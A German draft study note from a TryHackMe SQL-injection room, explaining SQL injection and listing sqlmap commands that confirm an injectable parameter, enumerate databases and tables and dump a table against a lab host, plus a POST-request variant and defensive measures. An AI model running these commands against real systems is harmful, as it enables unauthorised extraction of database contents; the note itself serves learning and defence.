---
title: "SQL-Injection mit sqlmap"
description: "Was SQL-Injection ist und wie sqlmap sie in Lab-Umgebungen automatisiert testet – von der ersten Prüfung bis zum schrittweisen Erkunden der Datenbank."
date: 2026-10-02
source: "TryHackMe – SQL Injection"
tags: [web, sql-injection, sqlmap]
draft: true
---

> Nur gegen eigene oder ausdrücklich freigegebene Anwendungen (CTF-Räume, eigenes Lab).

## Worum es geht
Bei SQL-Injection gelangt Nutzereingabe ungefiltert in eine Datenbankabfrage, sodass die Eingabe die
Abfrage verändert. `sqlmap` automatisiert das Aufspüren und Ausnutzen solcher Stellen.

## GET-basiert, Schritt für Schritt
Man tastet sich von außen nach innen vor – erst die Injection bestätigen, dann Datenbanken, Tabellen,
Spalten:
```bash
sqlmap -u "http://ziel.thm/search/?cat=1"                      # Parameter auf Injizierbarkeit prüfen
sqlmap -u "http://ziel.thm/search/?cat=1" --dbs               # Datenbanken auflisten
sqlmap -u "http://ziel.thm/search/?cat=1" -D users --tables   # Tabellen einer Datenbank
sqlmap -u "http://ziel.thm/search/?cat=1" -D users -T kunden --dump   # Inhalt einer Tabelle
```

## POST-basiert
Bei Formularen (POST) fängt man die Anfrage zuerst ab (z. B. mit einem Proxy), speichert sie und
übergibt sie als Datei:
```bash
sqlmap -r intercepted_request.txt
```
sqlmap erkennt darin automatisch die Parameter.

## In eigenen Worten
Immer vom Groben zum Feinen: Gibt es überhaupt eine Lücke? → welche Datenbanken? → welche Tabellen? →
welche Daten? Bei POST ist der einzige Unterschied, dass die gespeicherte Anfrage die Eingabe liefert.

## Verteidigungssicht
Die saubere Gegenmaßnahme sind **parametrisierte Abfragen (Prepared Statements)**, dazu strenge
Eingabevalidierung und möglichst geringe Datenbankrechte für den Anwendungs-Account. Eine WAF kann
automatisierte Tools wie sqlmap zusätzlich ausbremsen.
